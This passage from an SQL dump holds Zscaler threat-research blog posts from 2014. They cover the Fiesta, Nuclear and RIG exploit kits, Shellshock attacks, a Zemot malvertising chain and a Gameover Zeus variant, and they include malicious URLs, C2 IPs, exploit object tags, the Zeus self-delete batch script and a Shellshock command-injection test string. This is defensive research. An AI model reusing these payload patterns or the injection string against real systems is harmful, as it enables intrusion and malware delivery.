hxxp://hjwqk.ianlar[.]in/pofrj4l/7a77e441c530b7c15419520c540f06060658020c5156040a02550654550c0c06;1;2@@    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/1b88a025c530b7c1521a5d03500b0002005b0d035552020e0456095b51080a02;1;3@@    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/675e60f2d4cb58ae5c59595e070b5405070e005e025256090303040606085e05    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/2a78dd2dfa898b9d5b045b03555f0053035802035006025f0755065b545c0a53    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/33603690d9fdeed05f5a540b020d0b07020a030b0754090b06070753030e0107;900    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/2a7f53d52bfa0822410d415d040856020358025d0151540e07550605050b5c02;5061118    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/61295aeb0e3b886755415902045a575507080702010355590305035a05595d55;5;1    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/3bb805820e3b886750120903010e0a05025b5703045708090656535b000d0005;6;1    			·         hxxp://hjwqk.ianlar[.]in/pofrj4l/535c3355fb26fbd956435e5802080702040a00580751050e00070400030b5405;1;1  			     			   			  		  	           The Fiesta EK is performing the following exploitation attempts which are resulting in the multiple GET requests:    Adobe Flash      	Checks if Adobe Flash is installed and gets the application version.  	It then generates a GET request to fetch the run-time parameters for the previously downloaded SWF file \"rtu.swf\".  	      A sample object of type “application/x-shockwave-flash” with dynamic run-time parameters to run the exploit payload is created as shown below:          	  		  			  			“<object width=10 height=10 id=\'swf_id\' type=\'application/x-shockwave-flash\'><param name=\'movie\' value=\'FnkwX\'/><param name=\'allowScriptAccess\' value=\'always\'/><param name=\'FlashVars\' value=\'wetsgk=MWYzH\'/><param name=\'Play\' value=\'0\'/></object>\"  			  		  	           Microsoft Silverlight       	Checks if Microsoft Silverlight is installed in browser and gets the application version.  	It then generates a GET request to fetch the run-time parameters for the previously downloaded XAP file \"rtp.xap\".  	A sample object of type \"application/x-silverlight\" with dynamic run-time parameters to run the exploit payload is created as shown below:        	  		  			  			\"<object data=\'data:application/x-silverlight-2,\' type=\'application/x-silverlight-2\' width=10 height=10><param name=\'source\' value=\'LVSDE\'/><param name=\'initParams\' value=<LONG_STRING_VALUE></object>\"  			  		  	        Java      	Check if Java plugin is installed and enabled in the browser.  	Downloads a malicious Java archive (JAR) based on the installed version:  	  		JAR File -> ianlar.jar: 4/55 (CVE-2012-1723)  	  	  	It then generates a subsequent GET request to fetch parameter values required to execute the malicious JAR payload.  	Creates a custom applet tag utilizing the run-time parameter values to run the exploit payload as seen below:                     Adobe Reader             	       Checks for the presence of the Adobe Reader plugin.  	       Downloads and executes the malicious PDF file:   	  		       PDF File -> Ianlar.pdf: 8/55    	  	        Post-Infection    Upon successful exploitation, Fiesta EK was observed installing a new variant of Zemot Trojan from the following location:        	      hxxp://warzine[.]su/b/shoe/54602        This is a well known Click-Fraud Botnet family which will soon start click-fraud activity on the victim machine, making money for the malware authors.    This Click-Fraud malware family appears to be connected to many other EKs in addition to Fiesta. Some of the domains involved in the Click-Fraud activity:                 	num-lnkd.com  	syserty-war.com  	turend-hureft.com  	service-search.com  	fifa-seargh.com  	enjoy-result.com  	oak-search.com  	phantom-search.com  	companies-search.com  	calimera-search.com              The above domains were resolving to the following two servers located in Russia and Ukraine respectively:    	46.161.41.220  	192.162.19.34     A GET request to any of these domains look like this:                          - Sameer Patil', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/fiesta-exploit-kit-live-infection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (174, 'Shellshock Attacks Spotted In Wild [Updated Sept 26]', 'Deepen Desai', 'September 25, 2014', '[Updated Sept 26, 2014: added new analysis and exploit attempts]    Background    GNU Bash is susceptible to an arbitrary code execution vulnerability (CVE-2014-6271) dubbed as Shellshock. The vulnerability is due to failure to properly handle environment variables.    A remote attacker can exploit this flaw by interacting with an application that uses BASH environment variables to override or bypass environment restrictions to execute shell commands. If an attacker can control the value of an environment variable, then code execution can be achieved in the context of the application using the environment variable.    A public advisory was released regarding this vulnerability here:    http://seclists.org/oss-sec/2014/q3/650  https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271    Shellshock Attacks - CVE-2014-6271    Within hours of the public disclosure of this vulnerability, we have started seeing incidents of attacks targeting this vulnerability in the wild to download additional malware. It appears that Nginx and Apache web servers configured to use mod_cgi are two potentially vulnerable services that are actively being targeted in the wild. One such incident that we were able to confirm through mining our logs is shown below:                                 The server involved in the above case was found to be compromised and hosting ELF binaries which belongs to the same Linux Backdoor Trojan family with DDoS capabilities. We believe that the vulnerable Apache servers were resulting in the download of an ELF binary named \"apache\" whereas vulnerable Nginx servers were getting the ELF binary named \"nginx\". The only difference we saw in these two binaries was the hardcoded Command and Control server information.      Upon successful exploitation of CVE-2014-6271 vulnerability, the attacker is able to download and install the malicious ELF binary on the target Linux system. The malware connects to a predetermined Command and Control (C2) server on a specific port and awaits further instructions from the attacker. The C2 information can be seen hardcoded in the binary:                         The malicious ELF binary named \"apache\" is leading to a different C2 location \"162.253.66.76:53\".    This malware family is capable of performing the following actions:                     	BusyBox command injection exploit attempts  	Collect and send sensitive system information  	Perform Denial of Service attacks  	Brute force authentication attempt   	Opens a Backdoor connection for remote attacker      List of commands supported by this bot:                         The screenshots below show sample command and control communication from this bot:                     	  		  			  		  		  			Initial call back message and command to get system IP address  		  	             	  		  			  		  		  			Shell command & JUNK flooding attempt  		  	        Active Shellshock exploit attempts [Updated - September 26, 2014]    Below is a sample list of suspicious headers that we captured in past 12 hours attempting to exploit the Shellshock vulnerability (CVE-2014-6271). While majority of these appear to be testing attempts, some of them look malicious.                         Check if your server is vulnerable:    It is extremely important for the system administrators to apply appropriate security patch depending on the Linux distribution they are running. Below is a code snippet posted by Redhat that you could use to determine whether your BASH version is vulnerable or not:                             env x=\'() { :;}; echo vulnerable\'  bash -c \"echo this is a test\"                   Conclusion         We rate the severity of this vulnerability to be as critical as that of Heartbleed vulnerability discovered earlier this year. We are still investigating the level of impact associated with this threat.    Zscaler customers are protected from this threat and associated malware family. Zscaler ThreatLabZ is actively monitoring this threat and associated attacks in the wild.         - Deepen Desai', 'Malware;Vulnerability;Zero Day', 'https://www.zscaler.com/blogs/research/shellshock-attacks-spotted-wild-updated-sept-26');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (175, 'Malvertising Campaign Leading To Zemot', 'Chris Mannon', 'September 19, 2014', 'Malvertising has become a serious problem for advertisers and their clients alike. Times of Israel has been affected already by such an attack. During our analysis, we discovered multiple other legitimate websites affected by the same malvertising campaign. We have informed the website owners to take action. Below is a brief timeline of attack.\r\n\r\n \r\n\r\n \r\n\r\nA legitimate site leveraging zedo advertisements is the first victim in this attack.  The malicious redirect chain goes to zedo[.]com which will redirect the user to static[.]thebutton[.]com/d2.php?ds=true&dr=.  \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The Malicious Redirect chain timeline.\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The obfuscated url that is being hidden is static[.]the-button[.]com\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The next link in the redirection chain goes to a Swedish site.\r\n		\r\n	\r\n\r\n\r\n\r\nThe redirect chain then leads the victim to inter[.]wiab-service[.]se/geobalancer/geo2.php?acc=[xyz]\r\n&nrk=.  This is the final redirect that takes the user to [xyz][.]uni[.]me/ site where the Exploit Kit (EK) and eventually payload are sent to the victim.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The Obfuscation here is the final link to the Nuclear Exploit Kit.\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Part 1: Nuclear Exploit Kit\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Part 2: Nuclear Exploit Kit\r\n		\r\n	\r\n\r\n\r\nThe whole purpose of this broad attack is to download the final payload which happens to be a variant of Zemot. It gets downloaded via a Kuluoz variant which has been tied to Zemot click fraud activity in the recent days.\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Kuluoz/Zemot infection phone home activity.\r\n		\r\n	\r\n\r\n\r\nIf you are unfortunate to have visited one of the many sites which have been compromised by this threat, one strong indicator of infection will be the existence of a batch file which matches the below format:\r\n\r\nC:\\Users\\WIN7\\AppData\\Local\\Temp\\tmp37cd8110.bat\r\n\r\nThis malvertising campaign has been highly effective thus far and no site, despite its good intentions, appears to be given any quarter.\r\n\r\nZscaler is actively monitoring this threat and notifying any sites of compromise.', 'Exploit', 'https://www.zscaler.com/blogs/research/malvertising-campaign-leading-zemot');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (176, 'Nuclear Exploit Kit - Complete Infection Cycle', 'ThreatLabz', 'September 18, 2014', 'Zscaler ThreatLabZ has been seeing a steady increase in the Nuclear Exploit Kit (EK) traffic over the past few weeks. The detection of malicious activity performed by this EK remains low, due to usage of dynamic content and heavy obfuscation. In this blog, we will walk you through a complete Nuclear EK infection cycle with a live example. We will also share details of the identified payload, which had very low Anti-Virus (AV) detection rates.     The infection cycle begins with an unsuspecting user visiting a legitimate site that was compromised by the attackers. The compromised site in the example covered in this blog is www[.]cornwallmusiceducationhub[.]org that further redirects the victim to the Exploit Kit hosting server [80.85.86.133]. Nuclear EK is notorious for exploiting most popular browser plugins.    The following screenshot shows the malicious iframe injected on the compromised website.    	  		  			  		  		  			Malicious iframe in compromised domain  		  	            The malicious iframe leads the users to a loading site, which in this case performs a second level redirection as shown below, eventually leading the victim to the Nuclear EK\'s landing page.      	  		  			  		  		  			Redirecting to the Nuclear EK landing page  		  	                  Redirection Chain observed in our example:  Compromised site : www[.]cornwallmusiceducationhub[.]org/tag/heartlands-pool/  Second level redirection site: fluersutel[.]tecnopes[.]com[.]ar/miksopulp16[.]html  EK Landing site: actudismatik[.]e-xms[.]com[.]ar/2150b060shv/1/9ffbf35e4190fbba62f70c8477fa3964[.]html      	  		  			  		  		  			Redirection Chain  		  	                                  The Exploit kit landing page is heavily obfuscated to evade detection by AV and Intrusion Prevention Systems as seen below:    	  		  			  		  		  			Landing Page  		  	                              Now we will step through the complete dobfuscation of the landing page that was captured in above example. We leveraged the open source JavaScript beautifier to structure the landing page JavaScript code. Upon structuring the code, we determined that there were 51 unused variable declarations to confuse the researchers.    Going further, we observed that the following three functions VV8Y6W,wL3, and Fp4Ovo were responsible for the dynamic de-obfuscation of the EK landing page code. We have noted the action performed by each function in the following screenshot.      The following routine leverages the aforementioned functions to generate a key PluginDetect (V 0.8.8) script which we will discuss later.     Upon successful execution of the above code, the variable KKa will store the PluginDetect script. The following code will execute the script.    PluginDetect    This script is derived from the well-known JavaScript library PluginDetect. This library is used by the exploit kit authors to do a detailed reconnaissance of victim\'s browser plugins. We will walk you through various actions performed by this script before executing the exploit payload.    First the detectPlatform function will check for the operating system running on the victim machine:      Subsequently, the script will also check the version of well-known browser plugins, which includes Java, Adobe Reader, Adobe Flash, and Silverlight.       It then leverages the XML DOM information leakage vulnerability to enumerate through the system driver files residing in the C:\\Windows\\System32\\drivers\\ directory. If it finds any AV driver files, the script will terminate the infection cycle.    Next, the script will check for the vulnerable versions of the loaded plugins and accordingly run the identified application exploit function.                  The following screenshot shows the application specific exploit functions:    Below are the exploit payloads that were getting served if the related application plugin version was found to be vulnerable by the Nuclear EK instance that we analyzed. AV detection for the payloads delivered by this variant remained poor at the time of blog publication.    Silverlight Exploit:  CVE:2013-0074  actudismatik[.]e-xms[.]com[.]ar/2959962158/2/1410771180[.]xap  MD5: 94ef35e1ecf0a486ab790957ad794a85  Size: 9139  VT: 2/55  Flash Exploit:  CVE:2014-0515  http://actudismatik[.]e-xms[.]com[.]ar/2959962158/2/1410771180[.]swf  MD5: da5d57c700ebec211a6a57166700e796  Size: 5832  VT: 1/55  PDF Exploit:  http://actudismatik[.]e-xms[.]com[.]ar/2959962158/2/1410771180[.]pdf  MD5: 3676bf357f0678a609df6831b7a870a0  Size: 9769  VT: 1/54    If the exploit attempt is successful, then the EK code will silently download and install the following malware payload on the victim machine.    Malware:  http://actudismatik[.]e-xms[.]com[.]ar/f/2/1410771180/2959962158/7  MD5:acd0fe0c2ce27b8b9fa8741e23e39b81  Size:319488  VT:4/55       Dhruval', 'Exploit Kit;Malware;Vulnerability', 'https://www.zscaler.com/blogs/research/nuclear-exploit-kit-complete-infection-cycle');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (177, 'RIG EK Outbreak Continues', 'ThreatLabz', 'September 08, 2014', 'During daily data mining activities, we observe continual outbreaks of many exploit kits (EK) such as RIG EK. Logs are monitored and analyzed to come up with new protections, which are eventually deployed in the Zscaler cloud. The dynamic nature of EK’s landing page code, presents a constant challenge in providing generic detections. We need to take a look at various aspects of EK’s such as URLs/Domains/IP’s to come up with a generic detection guidance. In this regard, log analysis plays an important role.        In this blog we\'ll take a look logs from  last week (8/28/2014 - 9/5/2014), observed for RIG EK.                   	  		  			  		  		  			RIG EK Traffic (%)  		  	          The above chart illustrates the traffic trend of RIG EK over the past week. There was a significant spike noted on Sept. 4th.                  Sept 4th Domains/IP:                         	  		  			Domains  			IP  		  		  			eir.alexandrajarup[.]com  			194.58.101[.]24  		  		  			eir.alexandrajarup[.]com  			194.58.101[.]24  		  		  			uiue.nuiausqas[.]com  			194.58.101[.]24  		  		  			iow.alanmccaig[.]com  			191.101.14[.]125  		  		  			ods.alankellygang[.]com  			191.101.14[.]125  		  		  			uew.alankellygang[.]com  			191.101.14[.]125  		  		  			soi.alankellygang[.]com  			191.101.14[.]125  		  		  			eur.alankellygang[.]com  			191.101.14[.]125  		  		  			sod.alankellygang[.]com  			191.101.14[.]125  		  		  			soa.alankellygang[.]com  			191.101.14[.]125  		  		  			lol.alankellygang[.]com  			191.101.14[.]125  		  	               Sept 4th EK URLs:                          Sept 4th common URL pattern:               [.]com/?PHPSSESID=njrMNruDMh7HApzBKv7cTKZNKU7YHVnYmMzMhe6JVg                         RIG EK landing page content:                   	  		  			  		  		  			RIG EK Landing Page  		  	          Code analysis of the landing page shown above is not discussed here. For a full code analysis, please take a look at our blog post from last month. In that blog, we tried to come up with a generic de-obfuscation technique that helps to de-obfuscate the EKs such as RIG and Fiesta.                 Let\'s now take look at the overall traffic distribution by IP for the last week (8/28/2014 - 9/5/2014).               	  		  			  		  		  			Traffic distribution by EK IP\'s  		  	        	  		  			  			Traffic was observed from 13 unique IP addresses. IP \'191.101.14[.]125\', was seen to be spreading the EK\'s in large volumes. We also observed many IP addresses falling into three subnets.    			     			194.58.101[.]XXX    			191.101.13[.]XXX    			191.101.14[.]XXX    			     			We recommend blocking the aforementioned IP\'s. Subnet level blocks can also be used but we have to be bit cautious when doing so as legitimate sites may also be hosted in the same range.    			     			The following world map illustrates the geographical distribution of the EK IP\'s which have been observed. As noted, most activity is emanating from Russia.   			     			  				  					  						  					  					  						Geo-graphical distribution by EK IP\'s  					  				  			  			  		  	                 No geo-location information was available for IP\'s falling into \'191.101.XX.XX\' subnet.                 Below is the full list of domains and IP\'s seen for the previous week.                   	  		  			Domains  			IP  		  		  			tue.allthatsin[.]com  			178.132.203[.]113  		  		  			qie.allthatsin[.]com  			178.132.203[.]113  		  		  			dfu.aloliskincare[.]com  			194.58.101[.]38  		  		  			uer.alistairnunes[.]com  			194.58.101[.]31  		  		  			eir.alexandrajarup[.]com  			194.58.101[.]24  		  		  			oweuryt.account-ltunes[.]com  			191.101.13[.]139  		  		  			teyruyt.a[.]commodationinsauze[.]com  			191.101.13[.]139  		  		  			weorioi.a[.]commodationinsauze[.]com  			191.101.13[.]139  		  		  			owiery.wikusbotha[.]com  			191.101.13[.]140  		  		  			nuaysuq.planeimpressions[.]com  			5.31.72[.]115  		  		  			suyfdys.online-moneymakingsystem[.]com  			5.31.72[.]115  		  		  			iuiweyr.online-moneymakingsystem[.]com  			5.31.72[.]115  		  		  			oweiru.laughterisgoodmedicine[.]com  			5.31.72[.]115  		  		  			woiero.laughterisgoodmedicine[.]com  			5.31.72[.]115  		  		  			aosidoa.kensymicek[.]com  			191.101.13[.]202  		  		  			sdfusug.kensymicek[.]com  			191.101.13[.]202  		  		  			qwieuu.kensymicek[.]com  			191.101.13[.]202  		  		  			iuasid.kensymicek[.]com  			191.101.13[.]202  		  		  			odigoud.helny[.]com  			191.101.13[.]202  		  		  			qoiweur.helny[.]com  			191.101.13[.]202  		  		  			miiuis.helny[.]com  			191.101.13[.]202  		  		  			oeriouh.francisssmith[.]com  			191.101.13[.]202  		  		  			dciugi.francisssmith[.]com  			191.101.13[.]202  		  		  			gdofigu.forgottenapples[.]com  			191.101.13[.]201  		  		  			miqwue.boxsteravatar[.]com  			191.101.13[.]200  		  		  			popoqwe.dukeanddiva[.]com  			191.101.13[.]201  		  		  			mbivuc.click2maps[.]com  			191.101.13[.]201  		  		  			oiqwour.click2maps[.]com  			191.101.13[.]201  		  		  			mbivuc.click2maps[.]com  			191.101.13[.]201  		  		  			oiqwour.click2maps[.]com  			191.101.13[.]201  		  		  			oiaosdu.bluffswebdesign[.]com  			191.101.13[.]201  		  		  			dwieru.bluffswebdesign[.]com  			191.101.13[.]201  		  		  			nuasiud.amiramatthews[.]com  			191.101.13[.]200  		  		  			miuggid.748tmp[.]com  			191.101.13[.]200  		  		  			owierowu.748tmp[.]com  			191.101.13[.]200  		  		  			eoitoe.boxsteravatar[.]com  			191.101.13[.]200  		  		  			miqwue.boxsteravatar[.]com  			191.101.13[.]200  		  		  			wueriq.boxsteravatar[.]com  			191.101.13[.]200  		  		  			naduq.00tim[.]com  			191.101.13[.]198  		  		  			miasud.bigredshed.org[.]uk  			191.101.13[.]198  		  		  			qiuwer.121sky[.]com  			191.101.13[.]198  		  		  			digudyfg.belucent.co[.]uk  			191.101.13[.]196  		  		  			woiero.beauchamplondon.co[.]uk  			191.101.13[.]196  		  		  			eir.alexandrajarup[.]com  			194.58.101[.]24  		  		  			uiue.nuiausqas[.]com  			194.58.101[.]24  		  		  			iow.alanmccaig[.]com  			191.101.14[.]125  		  		  			ods.alankellygang[.]com  			191.101.14[.]125  		  		  			uew.alankellygang[.]com  			191.101.14[.]125  		  		  			soi.alankellygang[.]com  			191.101.14[.]125  		  		  			eur.alankellygang[.]com  			191.101.14[.]125  		  		  			sod.alankellygang[.]com  			191.101.14[.]125  		  		  			soa.alankellygang[.]com  			191.101.14[.]125  		  		  			lol.alankellygang[.]com  			191.101.14[.]125  		  		  			kick.alankellygang[.]com  			191.101.14[.]125  		  		  			sdifu.alanhalldriving[.]com  			191.101.14[.]125  		  		  			pqqie.alanhalldriving[.]com  			191.101.14[.]125  		  		  			weoriuwyt.alanhalldriving[.]com  			191.101.14[.]125  		  		  			oigydfg.alanhalldriving[.]com  			191.101.14[.]125  		  		  			oiweyr.alanhalldriving[.]com  			191.101.14[.]125  		  		  			fgydy.ajrobertsconsulting[.]com  			191.101.14[.]125  		  		  			husaus.ajrobertsconsulting[.]com  			191.101.14[.]125  		  		  			super.affogatomoments[.]com  			191.101.13[.]139  		  		  			iuweryw.activity-partners[.]com  			191.101.13[.]139  		  		  			weorioi.a[.]commodationinsauze[.]com  			191.101.13[.]139  		  		  			owiery.wikusbotha[.]com  			191.101.13[.]140  		  		  			oiqwour.click2maps[.]com  			191.101.13[.]201  		  		  			oiaosdu.bluffswebdesign[.]com  			191.101.13[.]201  		  		  			dwieru.bluffswebdesign[.]com  			191.101.13[.]201  		  		  			owierowu.748tmp[.]com  			191.101.13[.]200  		  		  			eoitoe.boxsteravatar[.]com  			191.101.13[.]200  		  		  			miqwue.boxsteravatar[.]com  			191.101.13[.]200  		  		  			qiuwer.121sky[.]com  			191.101.13[.]198  		  	                     The above trend shows a continuous outbreak of RIG EK in the wild. Data mining logs for such activity provides us with a sense of the trends being followed by the attackers. We will keep on sharing such information via blogs/scrapbook posts.                  Stay tuned!                  Pradeep', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/rig-ek-outbreak-continues');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (178, 'Nuclear Exploit Kit And Flash CVE-2014-0515', 'Rubin Azad', 'September 05, 2014', 'For this blog, we\'d like to walk you through a recent attack involving Nuclear Exploit Kit (EK) that we analyzed. It was found leveraging CVE-2014-0515, a buffer overflow in Adobe Flash Player discovered in April 2014.    Nuclear Exploit kit targets a number of known vulnerabilities including:    	pdf - PDF:Exploit.PDF-JS  	swf - CVE-2014-0515  	jar  - CVE-2012-0507    Below are the files which were downloaded during the exploitation attempts observed:       	  		  			FILE TYPE  			MD5  			SIZE  			CVE/THREAT  			VT HITS  		  		  			FLASH  			A1465ECE32FA3106AA88FD666EBF8C78  			5614  			CVE-2014-0515  			18 / 53  		  		  			JAR  			A93F603A95282B80D8AFD3F23C4D4889  			12396  			CVE-2012-0507  			26 / 54  		  		  			PDF  			19ED55EF17A49451D8052D0B51C66239  			9770  			Exploit.PDF-JS  			22 / 54  		  		  			EXE  			8BCE8A59F9E789BEFB9D178C9A03FB66  			104960  			Win32/Zemot  			39 / 53  		  	      Although there are other associated vulnerabilities that are being exploited by Nuclear Exploit kit, we will limit this blog post to reviewing the Flash exploitation (CVE-2014-0515).    Nuclear EK Landing    Unlike other EKs such as RIG, Nuclear EK\'s landing page code is highly obfuscated.           (Fig 1: Obfuscated Landing Page)    After de-obfuscation, the page looks as follows:         (Fig 2: De-Obfuscated Landing Page)    Nuclear EK\'s landing page checks for the following antivirus (AV) driver files and if finds any, terminates the exploitation process. We have seen these checks before in RIG EK too.         (Fig 3: Check for AV driver files)       If this AV check is passed, a javascript function then checks the installed Flash version and if a vulnerable version is detected on the client\'s browser, a call is then made to a dynamic Flash object creation module.             (Fig 4: Flash Call)         Here are the vulnerable Flash player checks:             (Fig 5: Checks if vulnerable version installed)       If the version check passes, the Flash exploitation process will commence as seen below.    CVE-2014-0515 exploit analysis    Here is the code that dynamically creates a new Flash Object:         (Fig 6: Flash Object Creation)    The Flash exploit payload that gets downloaded is highly obfuscated to evade AV detection. Below is a snippet of decompiled code from this Flash exploit:            (Fig 7: Decompiled Flash File)       There are two hard coded snippets of obfuscated shellcode in the action script as seen below:             (Fig x1,x2: Raw Shellcodes)       After de-obfuscating on the run time, it adds bytecode to a Shader Object from one of the de-obfuscated shell code snippets.                  (Fig 8: Shader Byte Code Filler)     The Shader\'s Pixel Bender is where this malformed byte code is written, which triggers the vulnerability.         Here is the Malformed byte code:             (Fig 9: Malformed data for Pixel Shader)              Disassembling Pixel Bender\'s byte code         We used Tinc Uro\'s program to get the PixelBender binary data decompiled.                  (Fig 10: Decompiled PixelBender data)         We can see the inappropriate content here. The Shader Object takes a float parameter whose default value is set to a matrix of 4x4 floats and the second float value of this matrix is invalid value triggering the vulnerability.         Conclusion    Since the downfall of the popular Blackhole Exploit Kit, we have seen the advent of many new Exploit Kits. Nuclear Exploit Kit definitely ranks in the Top 5 prevalent EKs in the wild at the moment. We have seen an increasing number of compromised sites and scam pages leading to Nuclear Exploit Kit in past three months. Some of the notable compromised sites during this time frame that were redirecting to Nuclear EK includes:    SocialBlade.com - A youtube statistics tracking site.  AskMen.com - Men\'s entertainment website  Facebook.com survey scam pages      Exploit kits generally make use of known vulnerabilities and Flash is a popular target. CVE-2014-0515 in particular targets a Flash vulnerability in Flash versions before 11.7.700.279 and 11.8.x through 13.0.x before 13.0.0.206 on Windows and OS X, and before 11.2.202.356 on Linux. It\'s critical to ensure that your employees aren\'t running outdated versions of Flash as it is commonly targeted by EKs.      References:           	http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/  	http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf  	http://www.kaourantin.net/2008/09/pixel-bender-pbj-files.html  	http://www.free-decompiler.com/flash/download.html  	http://malware-traffic-analysis.net/      - Rubin Azad', 'Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/nuclear-exploit-kit-and-flash-cve-2014-0515');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (179, 'A Look At The New Gameover Zeus Variant', 'Deepen Desai', 'August 30, 2014', 'Background\r\n\r\nZeus, also known as Zbot is one of the most notorious and wide-spread information stealing banking Trojans. It was first spotted in early 2007 and since then over the years it has evolved into a very sophisticated malware family with such features as:\r\n\r\n	Man-in-The-Browser keystroke logging\r\n	Form grabbing\r\n	Web injects\r\n	Kernel-mode rootkit update\r\n	Custom Peer-to-Peer (P2P) protocol for Command and Control communication\r\n	    Domain name Generation Algorithm (DGA)\r\n	Mobile Zeus, also known as Zeus in the mobile (Zitmo)\r\n\r\nIn June 2014, the U.S. Justice department launched an international law enforcement operation dubbed \'Operation Tovar\'  to take control of the Gameover Zeus P2P Botnet. This operation turned out to be a success with the shutdown of the Botnet activity and related Cryptolocker infection cycle.\r\n\r\nNew Gameover Zeus variant\r\n\r\nWe started seeing infection reports involving a new Gameover Zeus variant early last month (July 2014). The major infection vector still remains the same where the Cutwail Botnet is being leveraged by the cyber-criminals to send out spam e-mails with a malicious attachment. The malicious attachment on most occasions masquerades as a financial PDF document in order to lure an unsuspecting user into opening it. This is achieved by a combination of a fake PDF icon and double file extension as common file extensions are hidden by Windows unless disabled by the user. Some sample filenames we have seen includes:\r\n\r\n	Invoice.pdf.scr\r\n	E-statement.pdf.scr\r\n	Securedoc.pdf.scr\r\n\r\n\r\nOnce the user opens the attachment, it downloads the latest Gameover Zeus variant from a predetermined location as seen below in the unpacked payload memory:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Decrypted payload showing hardcoded URL\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Download of latest Zeus variant\r\n		\r\n	\r\n\r\nThe downloaded Gameover Zeus variant further drops a copy of itself and runs it as:\r\n\r\n\r\n	%Local Settings%\\Temp\\Eqxav\\epoxs.exe\r\n\r\nIt also drops and runs a batch file to delete the original executable file from the %TEMP% directory:\r\n\r\n\"C:\\WINDOWS\\system32\\cmd.exe\" /C \"C:\\DOCUME~1\\zuser\\LOCALS~1\\Temp\\MLZ6405.bat\"\r\n\r\n \r\n@echo off\r\n:akkaoz\r\ndel /F /Q /A RSHAIL \"C:\\Documents and Settings\\zuser\\Local Settings\\Temp\\mss3.exe\" >nul\r\nif exist \"C:\\Documents and Settings\\zuser\\Local Settings\\Temp\\mss3.exe\" goto akkaoz\r\n\r\n \r\nIt creates the following registry entry to ensure persistence upon system reboot:\r\n\r\n\r\n	HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Epoxs = \"%Local Settings%\\Temp\\Eqxav\\epoxs.exe\"\r\n\r\nThe bot further injects code into multiple system processes including Explorer.exe. It creates a remote thread that is responsible for running the Domain name Generation algorithm and connection to the Command & Control (C2) server. Upon successful connection to a C2 server, the bot will download the latest configuration containing list of banking URLs and web-inject plugins. Below is the list of sample domains that were generated by the DGA thread:\r\n\r\n \r\n\r\n\r\n	1vi2us1syijqh1gmhwuxmr1iwt[.]com\r\n	1i5ch6c1rvz8y7rp9bkbzme3v4[.]net\r\n	cul4hleyh07we1j2cc1ma964m[.]org\r\n	1l9asc2b3mmf3dpth1d1ct987[.]net\r\n	w7vld0891u1d1lhbvh17b5lfo[.]com\r\n	1aipcuziz5kqakplu9c5upujb[.]org\r\n	uccm0d1tdx38tonp9vh1jo2fq4[.]biz\r\n	i8gwl8hwjijd1ldh10ovl05iu[.]org\r\n	qxvt8m18q3wbf12992zo16mx3rb[.]com\r\n	14h98mo70orwoj8gf9j1a6sz4r[.]net\r\n	hv1eifdb3pxw1fp250cnpe34f[.]biz\r\n	17f2nku9i6zbtzs1u1v1pih3ie[.]net\r\n	1hn3lbe1qwdo6k1qm3b0q1yklg1r[.]com\r\n	ukoizw1g9vy8c1jxlh7610o2h8z[.]net\r\n	zja38vktoo9i1yc8xk16sq76p[.]biz\r\n	1ahnharg5apuxe5oeex1qy80ql[.]org\r\n	1qozjh16vj4xz1rhcr31x7hrtf[.]com\r\n\r\n \r\n\r\nIt also enumerates through all the running processes and steals information from them if any of the following strings are present:\r\n \r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Decrypted list of finance & banking related strings\r\n		\r\n	\r\n\r\nFeature evolution or de-evolution\r\n\r\nThe previous Gameover Zeus variant used a P2P command and control protocol in addition to a failover domain generation algorithm (DGA), to establish connection with a C2 server. However, this newer variant does not feature a P2P command and control protocol, instead it is falling back to the old DGA with fast flux tactics to hide the C2 servers. This in our opinion is a step backward as P2P was a more resilient feature.\r\n\r\nAnother step backward that we observed is the absence of the kernel-mode rootkit that was pushed out as an update early this year by the Gameover Zeus operators in the previous version. The rootkit made removal of the malware extremely difficult and disabled multiple security features on the infected system.\r\n\r\nDGA active domains and Command & Control server trends\r\n\r\nThe bot\'s DGA outputs 1,000 new unique domains each day but the Gameover Zeus operators are keeping the domains that they intend to use confidential until a few hours before the actual day when they get registered. Below is the mapping of DGA domains that were registered by the the Botnet operators and were actively resolving to C2 servers in past seven days:\r\n \r\nCommand and Control server IP information and Geo-distribution map:\r\n 